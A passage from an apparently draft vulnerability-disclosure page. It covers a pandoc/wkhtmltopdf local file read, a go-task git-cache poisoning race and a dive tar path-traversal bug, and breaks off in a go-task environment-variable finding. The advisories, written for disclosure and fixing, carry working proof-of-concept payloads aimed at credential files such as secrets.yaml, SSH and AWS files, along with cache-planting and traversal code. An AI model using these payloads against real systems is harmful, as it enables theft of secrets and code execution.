+
+The naive payload `footer-html: &quot;file:///etc/passwd&quot;` **does not work**. wkhtmltopdf
+treats the header/footer URL as an HTML document and appends a query string
+(`?page=N&amp;topage=M&amp;...`) when fetching it. For an **extensionless** path like
+`/etc/passwd` the appended `?page=N` produces a path wkhtmltopdf fails to resolve, so
+nothing is rendered. Two payload shapes that **do** work:
+
+1. **Target a file with an extension** so the `?query` is tolerated as a normal URL
+   query on a resolvable resource:
+
+   ```yaml
+   footer-html: &quot;file:///home/ci/.config/app/secrets.yaml&quot;
+   ```
+
+   (Any readable `*.txt`/`*.yaml`/`*.env`/`*.pem`/`*.json` works; the extension is
+   what makes wkhtmltopdf resolve the path with the trailing query.)
+
+2. **Stage a tiny local HTML footer that `&lt;iframe&gt;`s (or `fetch()`es) the target**,
+   sidestepping the extension constraint entirely:
+
+   ```yaml
+   footer-html: &quot;file:///tmp/footer.html&quot;   # footer.html = &lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;
+   ```
+
+## Proof of Concept
+
+Create `malicious.md` (extensioned-target variant):
+
+```yaml
+---
+title: &quot;Invoice&quot;
+footer-html: &quot;file:///home/ci/.config/app/secrets.yaml&quot;
+header-html: &quot;file:///home/ci/.ssh/known_hosts&quot;
+---
+
+Invoice content.
+```
+
+Convert:
+
+```bash
+pandoc --pdf-engine=wkhtmltopdf -o invoice.pdf malicious.md
+```
+
+wkhtmltopdf receives:
+
+```
+wkhtmltopdf \
+  --footer-html file:///home/ci/.config/app/secrets.yaml \
+  --header-html file:///home/ci/.ssh/known_hosts \
+  --enable-local-file-access \
+  /tmp/pandoc-12345.html \
+  invoice.pdf
+```
+
+The contents of the targeted file appear in the footer/header of every page of the
+generated PDF.
+
+**Verified end-to-end against real wkhtmltopdf:** a unique canary string placed in
+the target file was extracted from the rendered PDF text. The argument-injection
+anchor (`PDF.hs:213-215`) is exact.
+
+**Argument-interception confirmation** (engine-independent):
+
+```bash
+# mock-wkhtmltopdf logs all args to stderr
+cat &gt; /usr/local/bin/wkhtmltopdf &lt;&lt; &#x27;EOF&#x27;
+#!/bin/bash
+printf &#x27;ARG[%d]=%s\n&#x27; $(seq 0 $#) &quot;$@&quot; &gt;&amp;2
+EOF
+chmod +x /usr/local/bin/wkhtmltopdf
+
+pandoc --pdf-engine=wkhtmltopdf -o /dev/null malicious.md 2&gt;&amp;1 | grep -E &#x27;footer-html|header-html|local-file&#x27;
+# ARG[N]=--footer-html
+# ARG[N+1]=file:///home/ci/.config/app/secrets.yaml
+# ARG[N+2]=--header-html
+# ARG[N+3]=file:///home/ci/.ssh/known_hosts
+# ARG[N+4]=--enable-local-file-access
+```
+
+&gt; Note: the mock confirms *argument injection* only. The real file read was verified
+&gt; separately with the actual wkhtmltopdf binary using an extensioned target (above) —
+&gt; the original draft&#x27;s `file:///etc/passwd` payload was a false PoC and has been
+&gt; replaced.
+
+## Impact
+
+Any file readable by the pandoc process can be exfiltrated into a generated PDF.
+Attack surface includes pandoc-as-a-service platforms, documentation pipelines,
+and academic paper services that accept Markdown input. The attacker does not need
+shell access — only the ability to supply a Markdown document with YAML front matter.
+
+Sensitive targets (with extensions, per the constraint above): `~/.aws/credentials`,
+`*.env` files, application config (`*.yaml`/`*.json`), `*.pem` keys, CI secret files.
+
+## Mitigation
+
+Reject `file://` and `data:` schemes before passing values to wkhtmltopdf:
+
+```haskell
+let safeHtmlArg v
+      | &quot;file://&quot; `T.isPrefixOf` v = Nothing
+      | &quot;data:&quot;   `T.isPrefixOf` v = Nothing
+      | otherwise                  = Just v
+let toArgs (f, mbd) = maybe [] (\d -&gt; [&quot;--&quot; &lt;&gt; f, T.unpack d]) mbd
+```
+
+Alternatively, remove the hardcoded `--enable-local-file-access` and document a
+supported workaround for the original CSS loading use case.
+</pre></section><section class="card" id="f10"><div class="chead"><div class="ctitle"><span class="sev med">Medium</span><span class="cname">10. git-include cache uses a predictable temp path with no integrity check</span></div><div class="cmeta"><span class="badge tier2">Tier 2</span><span class="badge chan">GHSA / email (task@taskfile.dev)</span><button class="copy copyall" data-target="f10-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f10-title">git-include cache uses a predictable temp path with no integrity check</pre><button class="copy" data-target="f10-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f10-cve">Request CVE ID later</pre><button class="copy" data-target="f10-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (5.0, Medium)</div><div class="frow"><pre class="fval" id="f10-cvss">AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N</pre><button class="copy" data-target="f10-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f10-cwe">CWE-377, CWE-345</pre><button class="copy" data-target="f10-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f10-eco">Go</pre><button class="copy" data-target="f10-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f10-pkg">github.com/go-task/task</pre><button class="copy" data-target="f10-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f10-aff">all versions with git-based remote includes (&lt;= 3.51.1)</pre><button class="copy" data-target="f10-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f10-patched">None</pre><button class="copy" data-target="f10-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f10-desc">## Summary
+
+When go-task fetches a remote Taskfile over git, it caches the clone at a predictable
+path under the system temp directory, keyed only on public URL components. The cache
+hit-path trusts any directory that contains a `.git` subdirectory — no checksum, no
+remote-URL verification, no trust prompt for changed content. A local attacker who can
+write to the temp directory can plant a poisoned cache that is loaded and executed as
+the victim, while the trust prompt displays the legitimate URL.
+
+## Root cause
+
+`taskfile/node_git.go:131` (cache path) and the surrounding hit-check:
+
+```go
+cacheDir := filepath.Join(os.TempDir(), &quot;task-git-repos&quot;, cacheKey)
+gitDir := filepath.Join(cacheDir, &quot;.git&quot;)
+if _, err := os.Stat(gitDir); err == nil {
+    return cacheDir, nil   // cache hit — returned with NO integrity verification, NO network
+}
+// ... otherwise clone
+```
+
+Cache key, derived entirely from public URL parts (`node_git.go:235`):
+
+```go
+func (node *GitNode) repoCacheKey() string {
+    repoPath := strings.Trim(node.url.Path, &quot;/&quot;)
+    ref := node.ref
+    if ref == &quot;&quot; {
+        ref = &quot;_default_&quot;
+    }
+    return filepath.Join(node.url.Host, repoPath, ref)
+}
+```
+
+For `https://github.com/go-task/task.git` the key is
+`github.com/go-task/task.git/_default_`.
+
+&gt; **Correction vs. earlier drafts:** the path is `os.TempDir()/task-git-repos/...`,
+&gt; **not** a hardcoded `/tmp/...`. On macOS `os.TempDir()` returns `$TMPDIR`
+&gt; (`/var/folders/.../T/`); the `/tmp/...` form is correct only on Linux where
+&gt; `TMPDIR` is typically unset. Advisories should cite `os.TempDir()`.
+
+## The gap
+
+The HTTP remote-include path (`taskfile/reader.go`) verifies content: it computes a
+checksum, compares against the pinned value, and prompts on change
+(`taskfileChangedPrompt`). The git path has none of this — a `.git` directory planted
+by anyone is trusted identically to a legitimate clone.
+
+## Proof of concept
+
+Verified against a from-source build (commit `3dcaa7db`), reproduced **with the
+network denied** to prove no clone occurs.
+
+Step 1 — plant the poisoned cache (local write to the temp dir). Use the real temp
+dir; on macOS this is `$TMPDIR`, on Linux `/tmp`:
+
+```bash
+CACHE=&quot;$(go env GOTMPDIR)&quot;; [ -z &quot;$CACHE&quot; ] &amp;&amp; CACHE=&quot;${TMPDIR:-/tmp}&quot;
+DIR=&quot;$CACHE/task-git-repos/github.com/go-task/task.git/_default_&quot;
+mkdir -p &quot;$DIR&quot; &amp;&amp; cd &quot;$DIR&quot;
+git init -q &amp;&amp; git commit --allow-empty -m init -q
+cat &gt; Taskfile.yml &lt;&lt;&#x27;YAML&#x27;
+version: &#x27;3&#x27;
+tasks:
+  default:
+    cmds:
+      - &#x27;echo &quot;CACHE_POISONED=true&quot;&#x27;
+YAML
+```
+
+Step 2 — victim&#x27;s Taskfile.yml includes the legitimate repo:
+
+```yaml
+version: &#x27;3&#x27;
+includes:
+  lib:
+    taskfile: https://github.com/go-task/task.git
+```
+
+Step 3 — victim runs:
+
+```bash
+$ TASK_X_REMOTE_TASKFILES=1 task lib:default --yes
+```
+
+Observed output:
+
+```
+The task you are attempting to run depends on the remote Taskfile at &quot;https://github.com/go-task/task.git&quot;.
+--- Make sure you trust the source of this Taskfile before continuing ---
+Continue? [assuming yes]
+task: [lib:default] echo &quot;CACHE_POISONED=true&quot;
+CACHE_POISONED=true
+```
+
+Re-running the exact command under `sandbox-exec` with `(deny network*)` still printed
+`CACHE_POISONED=true` — a real github clone would have failed, so the planted `.git`
+cache was trusted with zero network and zero integrity check. The trust prompt shows
+the legitimate URL while serving attacker content.
+
+## Important constraint (durability / TOCTOU)
+
+`taskfile/reader.go:252` runs `defer CleanGitCache()`, which `os.RemoveAll`s the
+`task-git-repos` directory after each run. The cache is therefore **not durable**
+between runs — this is not persistent poisoning. The realistic exploit is a local
+**TOCTOU**: the attacker plants (or continuously re-plants in a loop) the cache dir in
+the window before the victim&#x27;s `os.Stat(gitDir)` hit-check. On a shared host this race
+is winnable with a tight re-plant loop, but the difficulty is real and is reflected in
+the `AC:H` score.
+
+## Impact
+
+A local attacker with write access to the shared temp dir (any user on a multi-user
+host, shared CI runner, or shared `/tmp` container volume) can execute code as another
+user who runs `task` with a git-based remote include. The misleading trust prompt
+(legitimate URL, attacker content) aids the deception.
+
+## Suggested fix
+
+1. Use a per-user cache dir with `0700` perms (e.g. under `os.UserCacheDir()`), not a
+   world-writable shared temp dir.
+2. On cache hit, verify the cached repo&#x27;s `origin` remote matches the expected URL;
+   `RemoveAll` and re-clone on mismatch.
+3. Extend the HTTP path&#x27;s checksum/trust-on-change verification to git-cached content.</pre><button class="copy" data-target="f10-desc">Copy</button></div></div><pre class="hidden" id="f10-full">Title: git-include cache uses a predictable temp path with no integrity check
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N (5.0, Medium)
+Weaknesses (CWE): CWE-377, CWE-345
+Ecosystem: Go
+Package name: github.com/go-task/task
+Affected versions: all versions with git-based remote includes (&lt;= 3.51.1)
+Patched versions: None
+
+Description:
+## Summary
+
+When go-task fetches a remote Taskfile over git, it caches the clone at a predictable
+path under the system temp directory, keyed only on public URL components. The cache
+hit-path trusts any directory that contains a `.git` subdirectory — no checksum, no
+remote-URL verification, no trust prompt for changed content. A local attacker who can
+write to the temp directory can plant a poisoned cache that is loaded and executed as
+the victim, while the trust prompt displays the legitimate URL.
+
+## Root cause
+
+`taskfile/node_git.go:131` (cache path) and the surrounding hit-check:
+
+```go
+cacheDir := filepath.Join(os.TempDir(), &quot;task-git-repos&quot;, cacheKey)
+gitDir := filepath.Join(cacheDir, &quot;.git&quot;)
+if _, err := os.Stat(gitDir); err == nil {
+    return cacheDir, nil   // cache hit — returned with NO integrity verification, NO network
+}
+// ... otherwise clone
+```
+
+Cache key, derived entirely from public URL parts (`node_git.go:235`):
+
+```go
+func (node *GitNode) repoCacheKey() string {
+    repoPath := strings.Trim(node.url.Path, &quot;/&quot;)
+    ref := node.ref
+    if ref == &quot;&quot; {
+        ref = &quot;_default_&quot;
+    }
+    return filepath.Join(node.url.Host, repoPath, ref)
+}
+```
+
+For `https://github.com/go-task/task.git` the key is
+`github.com/go-task/task.git/_default_`.
+
+&gt; **Correction vs. earlier drafts:** the path is `os.TempDir()/task-git-repos/...`,
+&gt; **not** a hardcoded `/tmp/...`. On macOS `os.TempDir()` returns `$TMPDIR`
+&gt; (`/var/folders/.../T/`); the `/tmp/...` form is correct only on Linux where
+&gt; `TMPDIR` is typically unset. Advisories should cite `os.TempDir()`.
+
+## The gap
+
+The HTTP remote-include path (`taskfile/reader.go`) verifies content: it computes a
+checksum, compares against the pinned value, and prompts on change
+(`taskfileChangedPrompt`). The git path has none of this — a `.git` directory planted
+by anyone is trusted identically to a legitimate clone.
+
+## Proof of concept
+
+Verified against a from-source build (commit `3dcaa7db`), reproduced **with the
+network denied** to prove no clone occurs.
+
+Step 1 — plant the poisoned cache (local write to the temp dir). Use the real temp
+dir; on macOS this is `$TMPDIR`, on Linux `/tmp`:
+
+```bash
+CACHE=&quot;$(go env GOTMPDIR)&quot;; [ -z &quot;$CACHE&quot; ] &amp;&amp; CACHE=&quot;${TMPDIR:-/tmp}&quot;
+DIR=&quot;$CACHE/task-git-repos/github.com/go-task/task.git/_default_&quot;
+mkdir -p &quot;$DIR&quot; &amp;&amp; cd &quot;$DIR&quot;
+git init -q &amp;&amp; git commit --allow-empty -m init -q
+cat &gt; Taskfile.yml &lt;&lt;&#x27;YAML&#x27;
+version: &#x27;3&#x27;
+tasks:
+  default:
+    cmds:
+      - &#x27;echo &quot;CACHE_POISONED=true&quot;&#x27;
+YAML
+```
+
+Step 2 — victim&#x27;s Taskfile.yml includes the legitimate repo:
+
+```yaml
+version: &#x27;3&#x27;
+includes:
+  lib:
+    taskfile: https://github.com/go-task/task.git
+```
+
+Step 3 — victim runs:
+
+```bash
+$ TASK_X_REMOTE_TASKFILES=1 task lib:default --yes
+```
+
+Observed output:
+
+```
+The task you are attempting to run depends on the remote Taskfile at &quot;https://github.com/go-task/task.git&quot;.
+--- Make sure you trust the source of this Taskfile before continuing ---
+Continue? [assuming yes]
+task: [lib:default] echo &quot;CACHE_POISONED=true&quot;
+CACHE_POISONED=true
+```
+
+Re-running the exact command under `sandbox-exec` with `(deny network*)` still printed
+`CACHE_POISONED=true` — a real github clone would have failed, so the planted `.git`
+cache was trusted with zero network and zero integrity check. The trust prompt shows
+the legitimate URL while serving attacker content.
+
+## Important constraint (durability / TOCTOU)
+
+`taskfile/reader.go:252` runs `defer CleanGitCache()`, which `os.RemoveAll`s the
+`task-git-repos` directory after each run. The cache is therefore **not durable**
+between runs — this is not persistent poisoning. The realistic exploit is a local
+**TOCTOU**: the attacker plants (or continuously re-plants in a loop) the cache dir in
+the window before the victim&#x27;s `os.Stat(gitDir)` hit-check. On a shared host this race
+is winnable with a tight re-plant loop, but the difficulty is real and is reflected in
+the `AC:H` score.
+
+## Impact
+
+A local attacker with write access to the shared temp dir (any user on a multi-user
+host, shared CI runner, or shared `/tmp` container volume) can execute code as another
+user who runs `task` with a git-based remote include. The misleading trust prompt
+(legitimate URL, attacker content) aids the deception.
+
+## Suggested fix
+
+1. Use a per-user cache dir with `0700` perms (e.g. under `os.UserCacheDir()`), not a
+   world-writable shared temp dir.
+2. On cache hit, verify the cached repo&#x27;s `origin` remote matches the expected URL;
+   `RemoveAll` and re-clone on mismatch.
+3. Extend the HTTP path&#x27;s checksum/trust-on-change verification to git-cached content.
+</pre></section><section class="card" id="f11"><div class="chead"><div class="ctitle"><span class="sev med">Medium</span><span class="cname">11. Path traversal in extractInner writes files outside the target on Extract (Ctrl+E)</span></div><div class="cmeta"><span class="badge tier2">Tier 2</span><span class="badge chan">GHSA / maintainer</span><button class="copy copyall" data-target="f11-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f11-title">Path traversal in extractInner writes files outside the target on Extract (Ctrl+E)</pre><button class="copy" data-target="f11-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f11-cve">Request CVE ID later</pre><button class="copy" data-target="f11-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (4.4, Medium)</div><div class="frow"><pre class="fval" id="f11-cvss">AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N</pre><button class="copy" data-target="f11-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f11-cwe">CWE-22</pre><button class="copy" data-target="f11-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f11-eco">Go</pre><button class="copy" data-target="f11-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f11-pkg">github.com/wagoodman/dive</pre><button class="copy" data-target="f11-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f11-aff">&lt;= 0.13.1 and current master (tested at d6c69194)</pre><button class="copy" data-target="f11-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f11-patched">None</pre><button class="copy" data-target="f11-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f11-desc">## Summary
+
+dive&#x27;s `extractInner` writes layer files to disk using the raw tar entry name
+(`header.Name`) with no path sanitization. A malicious Docker image whose layer
+contains an entry name with `..` components can write a file outside the intended
+extraction directory when the user invokes the Extract action (Ctrl+E) on a file in
+that layer. The safe `path.Clean` pattern already used elsewhere in the same file is
+not applied on the write path.
+
+## Affected code
+
+`dive/dive/image/docker/image_archive.go` (note the nested module dir — the in-repo
+path is `dive/dive/image/docker/...`, one level deeper than `image/docker/...`):
+
+```go
+// extractInner — line 337
+func extractInner(reader *tar.Reader, p string) error {
+    target := strings.TrimPrefix(p, &quot;/&quot;)
+    for {
+        header, err := reader.Next()
+        ...
+        name := header.Name                       // line 352 — RAW, unsanitized
+        ...
+        if strings.HasPrefix(name, target) {      // line 356
+            err := os.MkdirAll(filepath.Dir(name), 0755)  // line 357 — creates traversal dirs
+            ...
+            out, err := os.Create(name)           // line 362 — writes to traversal path
+            ...
+            _, err = io.Copy(out, reader)         // line 367 — attacker bytes written
+```
+
+The sibling analysis function `getFileList` does sanitize, proving the safe pattern
+was known:
+
+```go
+// getFileList — line 233
+name := path.Clean(header.Name)   // &quot;always ensure relative path notations are not parsed as part of the filename&quot;
+```
+
+## Reachability (confirmed live)
+
+`extractInner` is the backend of the interactive &quot;Extract File&quot; action, not dead code:
+
+```
+key/config.go:97   ExtractFile -&gt; &quot;ctrl+e&quot;
+view/filetree.go   binds ExtractFile -&gt; v.extractFile -&gt; calls listeners with node.Path()
+app/controller.go  onFileTreeViewExtract(p) -&gt; Content.Extract(ctx, image, layerId, p)
+docker/engine_resolver.go:56  Extract -&gt; ExtractFromImage(...)
+image_archive.go:303  ExtractFromImage -&gt; extractInner(...)
+```
+
+## Proof of concept (reproduced against dive&#x27;s real code)
+
+A Go test in `package docker` builds a malicious image tar in memory and calls dive&#x27;s
+**real** functions — both the unexported `extractInner` and the exported
+`ExtractFromImage` (the Ctrl+E backend). The malicious layer holds a benign entry
+under `usr/bin/` (to pre-create the prefix dir that `os.MkdirAll` needs) followed by a
+traversal entry:
+
+```go
+// malicious layer entries
+ltw.WriteHeader(&amp;tar.Header{Name: &quot;usr/bin/hello&quot;, Size: ..., Typeflag: tar.TypeReg})         // benign
+ltw.Write([]byte(&quot;#!/bin/sh\necho hello\n&quot;))
+ltw.WriteHeader(&amp;tar.Header{Name: &quot;usr/bin/hello/../../../../tmp/poc-review/dive-sentinel/dive-poc-pwned&quot;,
+                            Size: ..., Typeflag: tar.TypeReg})                                  // traversal
+ltw.Write([]byte(&quot;PWNED-BY-EXTRACTINNER&quot;))
+```
+
+Run:
+
+```
+$ go test -run &#x27;ZipSlip|NegativeControl|FixWouldNeutralize&#x27; -v ./dive/image/docker/
+```
+
+Observed:
+
+```
+TestExtractInner_ZipSlip        REPRODUCED: wrote /tmp/poc-review/dive-sentinel/dive-poc-pwned
+                                = &quot;PWNED-BY-EXTRACTINNER&quot; (escaped working dir .../001)
+TestExtractFromImage_ZipSlip    REPRODUCED (Ctrl+E backend): wrote /tmp/poc-review/dive-sentinel/dive-poc-pwned-e2e
+                                = &quot;PWNED-VIA-CTRL-E-PATH&quot;
+NegativeControl                 benign no-&quot;..&quot; entry written INSIDE the work dir
+FixWouldNeutralize              path.Clean + containment: sentinel NOT written
+```
+
+Both real entry points wrote the sentinel outside the working directory; `path.Clean`
+plus a containment check (the suggested fix) neutralized it.
+
+## Exploitation constraints (for accurate severity)
+
+Three real conditions bound difficulty — none prevents the bug, but they lower it from
+the &quot;trivial remote&quot; framing:
+
+1. The traversal entry name must start with the selected node&#x27;s path
+   (`strings.HasPrefix(name, target)`), so the crafted name begins with the file the
+   victim extracts, then escapes via `..`.
+2. `os.MkdirAll(filepath.Dir(name))` walks the literal `..`, so a benign sibling entry
+   must pre-create the prefix directory (trivial for an attacker controlling the layer).
+3. The extract path reads the matched layer as an **uncompressed** `.tar` (no gzip),
+   so the malicious layer must be uncompressed for the action to read it.
+
+Combined with the need for the victim to (a) analyze an attacker-controlled image and
+(b) manually press Ctrl+E on a specific node, this is `AC:H` + `UI:R`, local vector,
+write-only impact — Medium, not the originally-stated High (CVSS 7.1 overstated AC/UI).
+
+## Impact
+
+A malicious image (public registry, supply-chain, or shared CI) can write arbitrary
+files as the user analyzing it with dive: overwrite `~/.bashrc`, `~/.ssh/authorized_keys`,
+cron entries, or binaries on `$PATH`. Write-only — no direct confidentiality impact.
+
+## Suggested fix
+
+Apply the same sanitization `getFileList` already uses, plus an explicit containment
+check, before any `os.MkdirAll`/`os.Create`:
+
+```go
+name := path.Clean(header.Name)
+if name == &quot;.&quot; || strings.HasPrefix(name, &quot;..&quot;) || strings.HasPrefix(name, &quot;/&quot;) {
+    continue
+}
+// optionally: resolve against the extraction root and verify the result stays within it
+```</pre><button class="copy" data-target="f11-desc">Copy</button></div></div><pre class="hidden" id="f11-full">Title: Path traversal in extractInner writes files outside the target on Extract (Ctrl+E)
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N (4.4, Medium)
+Weaknesses (CWE): CWE-22
+Ecosystem: Go
+Package name: github.com/wagoodman/dive
+Affected versions: &lt;= 0.13.1 and current master (tested at d6c69194)
+Patched versions: None
+
+Description:
+## Summary
+
+dive&#x27;s `extractInner` writes layer files to disk using the raw tar entry name
+(`header.Name`) with no path sanitization. A malicious Docker image whose layer
+contains an entry name with `..` components can write a file outside the intended
+extraction directory when the user invokes the Extract action (Ctrl+E) on a file in
+that layer. The safe `path.Clean` pattern already used elsewhere in the same file is
+not applied on the write path.
+
+## Affected code
+
+`dive/dive/image/docker/image_archive.go` (note the nested module dir — the in-repo
+path is `dive/dive/image/docker/...`, one level deeper than `image/docker/...`):
+
+```go
+// extractInner — line 337
+func extractInner(reader *tar.Reader, p string) error {
+    target := strings.TrimPrefix(p, &quot;/&quot;)
+    for {
+        header, err := reader.Next()
+        ...
+        name := header.Name                       // line 352 — RAW, unsanitized
+        ...
+        if strings.HasPrefix(name, target) {      // line 356
+            err := os.MkdirAll(filepath.Dir(name), 0755)  // line 357 — creates traversal dirs
+            ...
+            out, err := os.Create(name)           // line 362 — writes to traversal path
+            ...
+            _, err = io.Copy(out, reader)         // line 367 — attacker bytes written
+```
+
+The sibling analysis function `getFileList` does sanitize, proving the safe pattern
+was known:
+
+```go
+// getFileList — line 233
+name := path.Clean(header.Name)   // &quot;always ensure relative path notations are not parsed as part of the filename&quot;
+```
+
+## Reachability (confirmed live)
+
+`extractInner` is the backend of the interactive &quot;Extract File&quot; action, not dead code:
+
+```
+key/config.go:97   ExtractFile -&gt; &quot;ctrl+e&quot;
+view/filetree.go   binds ExtractFile -&gt; v.extractFile -&gt; calls listeners with node.Path()
+app/controller.go  onFileTreeViewExtract(p) -&gt; Content.Extract(ctx, image, layerId, p)
+docker/engine_resolver.go:56  Extract -&gt; ExtractFromImage(...)
+image_archive.go:303  ExtractFromImage -&gt; extractInner(...)
+```
+
+## Proof of concept (reproduced against dive&#x27;s real code)
+
+A Go test in `package docker` builds a malicious image tar in memory and calls dive&#x27;s
+**real** functions — both the unexported `extractInner` and the exported
+`ExtractFromImage` (the Ctrl+E backend). The malicious layer holds a benign entry
+under `usr/bin/` (to pre-create the prefix dir that `os.MkdirAll` needs) followed by a
+traversal entry:
+
+```go
+// malicious layer entries
+ltw.WriteHeader(&amp;tar.Header{Name: &quot;usr/bin/hello&quot;, Size: ..., Typeflag: tar.TypeReg})         // benign
+ltw.Write([]byte(&quot;#!/bin/sh\necho hello\n&quot;))
+ltw.WriteHeader(&amp;tar.Header{Name: &quot;usr/bin/hello/../../../../tmp/poc-review/dive-sentinel/dive-poc-pwned&quot;,
+                            Size: ..., Typeflag: tar.TypeReg})                                  // traversal
+ltw.Write([]byte(&quot;PWNED-BY-EXTRACTINNER&quot;))
+```
+
+Run:
+
+```
+$ go test -run &#x27;ZipSlip|NegativeControl|FixWouldNeutralize&#x27; -v ./dive/image/docker/
+```
+
+Observed:
+
+```
+TestExtractInner_ZipSlip        REPRODUCED: wrote /tmp/poc-review/dive-sentinel/dive-poc-pwned
+                                = &quot;PWNED-BY-EXTRACTINNER&quot; (escaped working dir .../001)
+TestExtractFromImage_ZipSlip    REPRODUCED (Ctrl+E backend): wrote /tmp/poc-review/dive-sentinel/dive-poc-pwned-e2e
+                                = &quot;PWNED-VIA-CTRL-E-PATH&quot;
+NegativeControl                 benign no-&quot;..&quot; entry written INSIDE the work dir
+FixWouldNeutralize              path.Clean + containment: sentinel NOT written
+```
+
+Both real entry points wrote the sentinel outside the working directory; `path.Clean`
+plus a containment check (the suggested fix) neutralized it.
+
+## Exploitation constraints (for accurate severity)
+
+Three real conditions bound difficulty — none prevents the bug, but they lower it from
+the &quot;trivial remote&quot; framing:
+
+1. The traversal entry name must start with the selected node&#x27;s path
+   (`strings.HasPrefix(name, target)`), so the crafted name begins with the file the
+   victim extracts, then escapes via `..`.
+2. `os.MkdirAll(filepath.Dir(name))` walks the literal `..`, so a benign sibling entry
+   must pre-create the prefix directory (trivial for an attacker controlling the layer).
+3. The extract path reads the matched layer as an **uncompressed** `.tar` (no gzip),
+   so the malicious layer must be uncompressed for the action to read it.
+
+Combined with the need for the victim to (a) analyze an attacker-controlled image and
+(b) manually press Ctrl+E on a specific node, this is `AC:H` + `UI:R`, local vector,
+write-only impact — Medium, not the originally-stated High (CVSS 7.1 overstated AC/UI).
+
+## Impact
+
+A malicious image (public registry, supply-chain, or shared CI) can write arbitrary
+files as the user analyzing it with dive: overwrite `~/.bashrc`, `~/.ssh/authorized_keys`,
+cron entries, or binaries on `$PATH`. Write-only — no direct confidentiality impact.
+
+## Suggested fix
+
+Apply the same sanitization `getFileList` already uses, plus an explicit containment
+check, before any `os.MkdirAll`/`os.Create`:
+
+```go
+name := path.Clean(header.Name)
+if name == &quot;.&quot; || strings.HasPrefix(name, &quot;..&quot;) || strings.HasPrefix(name, &quot;/&quot;) {
+    continue
+}
+// optionally: resolve against the extraction root and verify the result stays within it
+```
+</pre></section><section class="card" id="f12"><div class="chead"><div class="ctitle"><span class="sev med">Medium</span><span class="cname">12. Remote Taskfiles can read host environment variables via Sprig env/expandenv</span></div><div class="cmeta"><span class="badge tier2">Tier 2</span><span class="badge chan">GHSA / email (task@taskfile.dev)</span><button class="copy copyall" data-target="f12-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f12-title">Remote Taskfiles can read host environment variables via Sprig env/expandenv</pre><button class="copy" data-target="f12-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f12-cve">Request CVE ID later</pre><button class="copy" data-target="f12-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (6.5, Medium)</div><div class="frow"><pre class="fval" id="f12-cvss">AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N</pre><button class="copy" data-target="f12-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f12-cwe">CWE-200</pre><button class="copy" data-target="f12-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f12-eco">Go</pre><button class="copy" data-target="f12-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f12-pkg">github.com/go-task/task</pre><button class="copy" data-target="f12-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f12-aff">all versions with remote Taskfile includes (&lt;= 3.51.1)</pre><button class="copy" data-target="f12-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f12-patched">None</pre><button class="copy" data-target="f12-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f12-desc">## Summary
+
+go-task registers the full slim-sprig function map into its template engine,
+including the OS-access functions `env`, `expandenv`, and `getHostByName`. These are
+available in every template context — including Taskfiles fetched from a remote
+source via the `includes:` directive. A malicious remote Taskfile can read arbitrary
+host environment variables and exfiltrate them over the network.
+
+## Root cause
+
+`internal/templater/funcs.go:60`:
+
+```go
+templateFuncs = template.FuncMap(sprig.TxtFuncMap())
+maps.Copy(templateFuncs, taskFuncs)
+```
+
+The slim-sprig map retains `env` (`os.Getenv`), `expandenv` (`os.ExpandEnv`), and
+`getHostByName`. No function is removed before registration, and the same map is used
+for local and remote Taskfiles alike. Helm strips exactly these functions from sprig
+for this reason.
+
+## The gap
+
+go-task already gates remote Taskfiles behind a trust prompt
+(`taskfile/reader.go`, `taskfileUntrustedPrompt`), acknowledging that remote content
+is dangerous. But once the prompt is accepted — or bypassed with `--yes`, common in
+CI — the remote Taskfile gets unrestricted access to the host environment through
